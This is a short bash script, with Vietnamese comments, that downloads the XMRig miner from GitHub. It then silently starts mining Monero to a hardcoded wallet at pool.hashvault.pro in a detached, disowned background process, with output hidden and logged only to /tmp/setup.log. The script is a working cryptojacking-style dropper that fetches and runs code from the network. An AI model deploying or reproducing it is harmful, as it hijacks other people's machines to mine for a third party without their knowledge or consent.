#!/bin/bash

# Chạy toàn bộ trong subshell background để thoát ngay lập tức
(
    LOGFILE=/tmp/setup.log
    DIR="$HOME/xmrig-6.26.0"
    URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"

    echo "$(date) [START]" >> "$LOGFILE"

    # Nếu đang chạy rồi thì bỏ qua
    if pgrep -x "xmrig" > /dev/null 2>&1; then
        echo "$(date) [SKIP] Đang chạy" >> "$LOGFILE"
        exit 0
    fi

    # Tải nếu chưa có
    if [ ! -f "$DIR/xmrig" ]; then
        cd ~
        echo "$(date) [DL] Tải..." >> "$LOGFILE"
        wget -q "$URL" -O xmrig.tar.gz >> "$LOGFILE" 2>&1
        tar -xzf xmrig.tar.gz >> "$LOGFILE" 2>&1
        rm -f xmrig.tar.gz
        chmod +x "$DIR/xmrig"
        echo "$(date) [DL] Xong" >> "$LOGFILE"
    fi

    # Chạy
    cd "$DIR"
    echo "$(date) [RUN] Khởi động" >> "$LOGFILE"
    xmrig --url pool.hashvault.pro:443 --user 82tvM9cdwYieKVPKCHx6TJVKbekciy3hSGr54XDEYNYt6atNYkGSeeSS9qrVyjjrufMeyTaiBBTAWFuZG11gdKMc1a31YMG --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >> "$LOGFILE" 2>&1

) </dev/null >/dev/null 2>&1 &
disown

exit 0
